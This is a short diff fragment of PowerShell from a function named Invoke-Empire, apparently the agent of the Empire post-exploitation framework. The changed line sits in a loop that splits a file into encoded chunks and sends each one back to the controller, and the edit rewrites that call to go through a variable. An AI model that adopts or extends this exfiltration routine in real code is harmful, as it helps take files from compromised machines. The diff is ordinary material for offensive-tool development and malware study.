@@ -850,7 +850,7 @@ function Invoke-Empire {
 
                         if($EncodedPart) {
                             $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
-                            Send-Message -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID)
+                            (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID))
                             $Index += 1
 
                             # if there are more parts of the file, sleep for the specified interval
